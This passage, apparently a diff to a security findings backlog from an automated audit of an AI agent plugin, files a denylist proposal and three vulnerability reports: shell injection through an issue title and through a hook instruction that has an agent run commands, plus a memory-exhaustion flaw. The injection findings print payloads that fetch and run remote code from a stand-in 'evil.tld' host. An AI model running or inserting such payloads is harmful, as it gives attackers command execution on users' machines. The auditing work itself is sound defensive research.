@@ -1676,3 +1676,218 @@ location: plugins/ievo/agents/evolution.md Step 2 ("Ensure target file exists lo
 Confirmed by direct re-read: Step 2 reads verbatim "For agent: `gh api repos/<owner>/<repo>/contents/<path>` → `.claude/agents/<name>.md`" with no preceding validation instruction anywhere in the step, and `disallowedTools` does not appear anywhere in `evolution.md` (grepped the full file — zero matches), unlike `deep-reviewer.md`/`security-auditor.md`/`vuln-scanner.md` which all self-enforce a denylist. `owner`/`repo`/`path` here trace back to the plugin's own declared source coordinates (attacker-controlled if the plugin is malicious) — git tree/blob paths are not charset-restricted, so a crafted path containing shell metacharacters would execute as a shell command once interpolated. This is the exact vulnerability class already fixed via clone+Read/Glob in `security-check/SKILL.md` (#347), `inspect/SKILL.md` (#348), and `evo/SKILL.md` (#355) — `evolution.md`'s own vendor-fetch step was missed by that fix pass. Distinct from the already-filed S-2026-07-09-003/#357 (evolution.md's separate gap: no `security-auditor` re-audit gate on vendored content, CWE-829) — this finding is about the fetch mechanism itself being command-injectable, not about missing re-audit. Full exploit chain, preconditions, and recommendation: see issue body.
 
 ---
+
+## F-2026-07-13-001 — Add `disallowedTools:` denylist to `repo-indexer.md` agent for defense-in-depth consistency
+
+```yaml
+id: F-2026-07-13-001
+discovered_at: 2026-07-13T09:52:00Z
+run_id: 29239669529
+target_repo: ievo-ai/skills
+title: Add disallowedTools denylist to repo-indexer.md agent — the only one of 5 iEvo agents without one
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/371
+effort: low
+scope: single-file
+evidence:
+  - plugins/ievo/agents/repo-indexer.md (direct source read, this run's vuln-scan dogfooding pass): frontmatter tools block (Bash, Read, Write, Glob) carries no disallowedTools, unlike the other 4 iEvo agents
+```
+
+`repo-indexer.md` is the only one of iEvo's 5 sub-agents (`deep-reviewer.md`, `evolution.md`, `repo-indexer.md`, `security-auditor.md`, `vuln-scanner.md`) with no `disallowedTools` defense-in-depth denylist, despite holding unrestricted `Bash` + `Write` access and being the one agent that clones and scans arbitrary third-party repo content (the highest-exposure input class in the plugin). This is the same gap class already closed for two sibling agents via dedicated feature-proposal issues: F-2026-06-29-001/skills#266 (`deep-reviewer.md`) and F-2026-07-05-001/skills#312 (`vuln-scanner.md`), both citing the identical rationale — "skill-level `disallowed-tools` does NOT propagate to a Task-tool-dispatched sub-agent" (AGENTS.md § Security model), so each agent must self-enforce.
+
+Confirmed by direct re-read this run: `repo-indexer.md`'s frontmatter (lines 4-8) declares `tools: Bash, Read, Write, Glob` with zero `disallowedTools` block anywhere in the file (grepped in full). By contrast, `evolution.md`, `security-auditor.md`, `deep-reviewer.md`, and `vuln-scanner.md` all declare an explicit denylist (`Bash(rm*|mv*|cp*|curl*|wget*|sudo*|chmod*)` + `WebSearch`, per AGENTS.md § Security model's documented rationale). This gap has been independently noted as a deferred candidate in security-pass reports since 2026-07-08 (folded into the CWE-78 owner/repo-validation finding on the same file, S-2026-07-10-001/#361, currently held) but never filed as its own standalone capability gap — unlike its two sibling agents, which each got a dedicated issue. This run's vuln-scan dogfooding pass built it out as a distinct, standalone finding (missing guardrail is a different control than input validation — fixing #361 alone would not add this denylist).
+
+This is a feature-proposal (missing defense-in-depth capability), not a security-finding — the file has no currently-known live exploit of this gap in isolation; it compounds the blast radius IF the already-open #361 (owner/repo injection) is ever exploited, exactly as a denylist's role is to backstop other controls rather than to independently prevent an attack.
+
+## Problem / Capability gap
+
+If `repo-indexer.md`'s Bash execution is ever hijacked — via the already-open #361 injection, or any other future vector — there is no secondary control blocking destructive commands (`rm`, `mv`, `cp`, `curl`, `wget`, `sudo`, `chmod`) or `WebSearch`-based exfiltration. Every other iEvo agent with comparable Bash/network exposure already has this backstop; `repo-indexer.md` is the sole outlier.
+
+## Evidence
+
+- `plugins/ievo/agents/repo-indexer.md` (direct source read, this run): frontmatter `tools:` block has no `disallowedTools`, confirmed via full-file grep.
+- Precedent: F-2026-06-29-001/skills#266 (`deep-reviewer.md`) and F-2026-07-05-001/skills#312 (`vuln-scanner.md`) — same gap class, same fix pattern, both already merged.
+
+## Proposed solution
+
+Add the identical `disallowedTools` block used by `evolution.md`/`security-auditor.md`/`deep-reviewer.md`/`vuln-scanner.md` to `repo-indexer.md`'s frontmatter: deny `Bash(rm*)`, `Bash(mv*)`, `Bash(cp*)`, `Bash(curl*)`, `Bash(wget*)`, `Bash(sudo*)`, `Bash(chmod*)`, and `WebSearch`. No functional capability is lost — `repo-indexer.md`'s only Bash usage is invoking `scan_repo.mjs` and its only network-adjacent tool is that script's own git operations, none of which match the denied prefixes.
+
+## Files affected
+
+| File | Change | Notes |
+|------|--------|-------|
+| `plugins/ievo/agents/repo-indexer.md` | modified | add `disallowedTools` frontmatter block, mirroring the 4 sibling agents |
+| `AGENTS.md` | modified | one-line update to § Security model listing `repo-indexer.md` among the self-enforcing sub-agents (mirrors the v0.50.7 changelog precedent for `evolution.md`) |
+
+## API / UX surface
+
+None — frontmatter-only change, no new commands or user-facing surface.
+
+## Acceptance criteria
+
+- [ ] `repo-indexer.md` frontmatter includes a `disallowedTools` block matching the pattern used by `evolution.md`/`security-auditor.md`/`deep-reviewer.md`/`vuln-scanner.md`
+- [ ] AGENTS.md § Security model's list of self-enforcing sub-agents includes `repo-indexer.md`
+- [ ] `validate_agents.mjs` still passes (denylist syntax is consistent with the other 4 agents)
+
+## Effort estimate
+
+- Scope: single-file
+- Effort: low (~15 min)
+- Risk: low
+
+## Open questions for the operator
+
+- None — this is a direct, low-risk application of an already-established pattern (2 prior precedents merged without issue).
+
+## Related
+
+- **Eva research run:** https://github.com/ievo-ai/eva/actions/runs/29239669529
+- **Backlog entry (ievo-ai/eva):** https://github.com/ievo-ai/eva/blob/main/researches/findings-backlog.md — search for `id: F-2026-07-13-001`
+- **Companion proposals:** `ievo-ai/skills#266` (deep-reviewer.md precedent), `ievo-ai/skills#312` (vuln-scanner.md precedent), `ievo-ai/skills#361` (open — the CWE-78 owner/repo-validation finding on this same file, a distinct control)
+
+---
+Filed by Eva research run 29239669529 against `ievo-ai/eva` (research repo). Triage with `accepted` / `rejected` / `needs-discussion` labels.
+
+---
+
+## S-2026-07-13-001 — feedback/SKILL.md issue-title interpolated unguarded into `gh issue create --title` Bash arg
+
+```yaml
+id: S-2026-07-13-001
+discovered_at: 2026-07-13T09:52:00Z
+run_id: 29239669529
+target_repo: ievo-ai/skills
+title: feedback/SKILL.md Step 6 interpolates the derived issue title directly into a gh issue create --title Bash arg with no shell-safe quoting, unlike the body (which is explicitly routed through --body-file)
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/372
+cwe: CWE-78
+confidence: high
+location: plugins/ievo/skills/feedback/SKILL.md:349,356
+```
+
+`/ievo:feedback` Step 6 derives a "short summary, 6-10 words" title from the user's free-form feedback text (or, via flow C, from an `/ievo:evo` lesson capture) and builds a literal Bash command line containing `--title "<title>"` (both the primary label-provisioning path at line 349 and the B2 no-labels fallback at line 356). Unlike the issue body — which Step 6 explicitly writes via the Write tool + `--body-file` specifically because "User-verbatim feedback may contain backticks, `$(...)`, or `${VAR}` patterns that shells interpolate if passed as an inline string argument" — the derived title has no equivalent protection. Because the calling agent constructs the literal Bash command string by substituting the title text directly, any `$(...)`/backtick/embedded-quote sequence in the title is resolved by the real shell that executes `gh issue create`, before `gh` itself ever runs — double-quoting alone does not stop command substitution in POSIX shells. This is a deferred candidate independently re-confirmed present across 4+ consecutive security passes (2026-07-08 through 2026-07-12) without being filed; this run built out the full exploit chain and confirmed the finding at high confidence with two distinct affected call sites (both fire depending on whether the filing user has label-creation permission — the B2 fallback is the more commonly hit path for non-maintainer contributors).
+
+## Exploit chain
+
+Entry: a user (or the `/ievo:evo`→`/ievo:feedback` flow C hand-off) supplies free-form feedback text; Step 6 derives a 6-10 word title from it. Flow: the title is substituted directly into a Bash `gh issue create --title "<title>" ...` command line (line 349 primary path, line 356 B2 fallback when label-provisioning fails — the latter fires for any non-maintainer contributor, since only maintainers can create labels). No Write-tool/positional-argument protection is applied to the title, unlike the body. A crafted title containing `$(curl evil.tld|sh)` or a backtick-wrapped payload is resolved by the shell that assembles the Bash tool call, executing before `gh issue create` itself runs. Impact: arbitrary command execution in the session's Bash context (which has `gh` authenticated, `git`, network, and filesystem access), triggered by the ordinary act of filing feedback.
+
+## Preconditions
+
+- The derived 6-10 word title (or the underlying free-form feedback text it's summarized from) contains shell metacharacters
+- The agent follows Step 6's template literally, substituting the title into the shown Bash command rather than using an equivalent Write/positional-argument-safe pattern
+- `gh` CLI is installed and authenticated
+- The user does not notice the injected payload in the Step 5 preview before confirming Submit
+
+## Blast radius
+
+- Confidentiality: high
+- Integrity: high
+- Availability: high
+
+## Recommendation
+
+Apply the same fix already used for the body: never interpolate the derived title directly into an inline `--title "..."` Bash string. Either (a) pass the title as a `sh -c '...' "$1"` positional argument (the pattern `hooks-setup/SKILL.md`'s custom-script examples already use), or (b) write the title to a small local file via the Write tool and reference it with `--title "$(cat titlefile)"` where the file's content was populated via the Write tool, never via a live string substitution performed by the agent at command-construction time. Fix both call sites (lines 349 and 356) together since they share the same title-construction logic.
+
+## Related
+
+- **Eva research run:** https://github.com/ievo-ai/eva/actions/runs/29239669529
+- **Backlog entry (ievo-ai/eva):** https://github.com/ievo-ai/eva/blob/main/researches/findings-backlog.md — search for `id: S-2026-07-13-001`
+
+---
+Filed by Eva research run 29239669529 via `/ievo:vuln-scan` dogfooding (eva#165). Triage with `accepted` / `rejected` / `needs-discussion` labels.
+
+---
+
+## S-2026-07-13-002 — evo-auto-enable/SKILL.md correction-capture hook embeds unescaped free-form text in a single-quoted Bash arg
+
+```yaml
+id: S-2026-07-13-002
+discovered_at: 2026-07-13T09:52:00Z
+run_id: 29239669529
+target_repo: ievo-ai/skills
+title: evo-auto-enable/SKILL.md's correction-capture.sh UserPromptSubmit hook instructs the agent to embed free-form correction text in a single-quoted Bash arg with no escaping guidance, breakable via an embedded single quote
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/373
+cwe: CWE-78
+confidence: high
+location: plugins/ievo/skills/evo-auto-enable/SKILL.md:167
+```
+
+Once auto-evolution mode is enabled (`.ievo/evo-auto.flag` present, set up by this skill), every subsequent user prompt fires the `UserPromptSubmit` hook `.ievo/hooks/scripts/correction-capture.sh`, which injects an instruction as `additionalContext`: if the agent judges the user's message a genuine correction, it should — AFTER responding — "record it verbatim as an evolution candidate by running: `node ${ACC} append --session ${sid} --text '<the correction in one line>'`". The `<the correction in one line>` placeholder is filled in by the agent with the free-form correction text and embedded inside single quotes, with zero escaping guidance anywhere in the hook or the SKILL.md that generates it. Ordinary corrections routinely contain an apostrophe (e.g. "don't do that", "that's wrong") — trivially breaking out of the single-quoted string — and a deliberately crafted correction can go further and chain additional shell commands. This is a deferred candidate re-confirmed present at low confidence in prior runs; this run built out a complete, high-confidence exploit chain showing the auto-fire (no confirmation gate) makes this the most immediately dangerous of this run's findings.
+
+## Exploit chain
+
+Entry: auto-evolution mode is on (`.ievo/evo-auto.flag` exists). On any subsequent user turn, the hook fires unconditionally and injects its instruction into the model's context. Flow: if the agent classifies the turn as a correction (an easy bar per the hook's own examples — "no, we always X here", "stop doing Y"), it constructs and executes `node ${ACC} append --session ${sid} --text '<correction text>'` via the Bash tool, substituting the raw correction text between single quotes with no escaping. Text containing an unescaped single quote plus shell metacharacters (e.g. `foo'; curl https://evil.tld/x.sh | sh #`) breaks out of the quoted string, and the trailing shell metacharacters execute as separate commands. Impact: arbitrary command execution triggered automatically by ordinary conversational text, with no confirmation gate for this specific action (the mode's "never write silently" rule governs overlay writes, not this Bash invocation) — the command runs with whatever access the session already holds (git, gh, filesystem, network).
+
+## Preconditions
+
+- `.ievo/evo-auto.flag` exists (auto-evolution mode enabled via this skill)
+- The agent classifies some user turn as a "genuine correction"
+- The correction text contains an unescaped single quote plus shell metacharacters — plausible from ordinary user phrasing or from pasted/quoted untrusted content the agent treats as the user's own correction
+
+## Blast radius
+
+- Confidentiality: high
+- Integrity: high
+- Availability: high
+
+## Recommendation
+
+Change the hook's instruction to never ask the agent to embed free-form text inside a shell string it then executes. Have the agent write the correction text to a temp file via the Write tool and invoke the accumulator with a fixed, non-interpolated command such as `node ${ACC} append --session ${sid} --text-file <tmp-path>` (with the accumulator script reading `--text-file` from disk), matching the same Write-tool-not-inline-Bash-arg pattern used for feedback bodies (`feedback/SKILL.md` Step 6) and recommended for feedback titles (S-2026-07-13-001, same run).
+
+## Related
+
+- **Eva research run:** https://github.com/ievo-ai/eva/actions/runs/29239669529
+- **Backlog entry (ievo-ai/eva):** https://github.com/ievo-ai/eva/blob/main/researches/findings-backlog.md — search for `id: S-2026-07-13-002`
+
+---
+Filed by Eva research run 29239669529 via `/ievo:vuln-scan` dogfooding (eva#165). Triage with `accepted` / `rejected` / `needs-discussion` labels.
+
+---
+
+## S-2026-07-13-003 — scan_repo.mjs performs unbounded synchronous reads of attacker-controlled repo content with no size cap
+
+```yaml
+id: S-2026-07-13-003
+discovered_at: 2026-07-13T09:52:00Z
+run_id: 29239669529
+target_repo: ievo-ai/skills
+title: scan_repo.mjs's parseFrontmatter/enumerateOnePlugin/enumerateHooks/enumerateMcp call readFileSync with no size cap before reading attacker-controlled repo files, enabling a memory-exhaustion DoS against the scanning pipeline
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/374
+cwe: CWE-400
+confidence: high
+location: plugins/ievo/scripts/scan_repo.mjs:142,244,319,354
+```
+
+`scan_repo.mjs` shallow-clones and scans arbitrary, fully attacker-controlled GitHub repos (the community-index pipeline and the `index-repos`/`repo-indexer` install path). Its enumeration functions — `parseFrontmatter()` (agent/skill/command `.md` files, line 142), `enumerateOnePlugin()` (`.claude-plugin/plugin.json`, line 244), `enumerateHooks()` (`hooks/hooks.json`, line 319), and `enumerateMcp()` (`.mcp.json`, line 354) — each call `readFileSync(filePath, "utf-8")` with no file-size check before or during the read. `git clone --depth=1` limits history depth but not blob size — a single commit can still contain a multi-GB file. This is a deferred candidate independently re-confirmed present across 4+ consecutive security passes (2026-07-07 through 2026-07-12) without being filed; this run re-confirmed all 4 call sites (line numbers shifted after the v0.51.1 patch) and promoted it from the deferred list given no higher-blast-radius candidate remained unfiled after this run's top 2 slots.
+
+## Exploit chain
+
+Entry: attacker submits or controls a GitHub repo accepted for scanning by the community-index pipeline (no external repo-size gate before `scan_repo.mjs` runs) or scanned locally via `/ievo:index-repos`. Flow: the attacker places a single very large file (e.g. a multi-GB `SKILL.md`, `plugin.json`, or `hooks.json`) in the repo. When `checkoutOrRefresh()` clones it and the enumeration functions reach that file, `readFileSync` attempts to load the entire file into a single in-memory string synchronously with no size guard at any of the 4 call sites. Impact: exhausts the scanning process's memory, crashing/OOM-killing the Node process (or its container/runner) or blocking the event loop for the read's duration — a denial of service against the shared community-index scanning pipeline (wasted CI minutes, failed scans for repos queued behind it, repeated crash-loop if force-refresh keeps re-triggering).
+
+## Preconditions
+
+- Attacker-controlled repo is accepted for scanning by the community-index pipeline or scanned via `/ievo:index-repos` / `repo-indexer.md`
+- No repo-level or file-level size limit is enforced upstream of these `readFileSync` calls
+- Scanning host has finite memory that a single oversized read can exhaust
+
+## Blast radius
+
+- Confidentiality: none
+- Integrity: none
+- Availability: high
+
+## Recommendation
+
+Add an explicit size guard immediately before each `readFileSync` call in `scan_repo.mjs` (`parseFrontmatter` line 142, `enumerateOnePlugin` line 244, `enumerateHooks` line 319, `enumerateMcp` line 354): `statSync(filePath).size` checked against a small cap (e.g. 256 KB — frontmatter/manifest files are never legitimately larger) and skip/short-circuit with a factual `oversized: true` flag rather than reading the file, mirroring the pattern already used for `truncate()`.
+
+## Related
+
+- **Eva research run:** https://github.com/ievo-ai/eva/actions/runs/29239669529
+- **Backlog entry (ievo-ai/eva):** https://github.com/ievo-ai/eva/blob/main/researches/findings-backlog.md — search for `id: S-2026-07-13-003`
+
+---
+Filed by Eva research run 29239669529 via `/ievo:vuln-scan` dogfooding (eva#165). Triage with `accepted` / `rejected` / `needs-discussion` labels.
+
+---
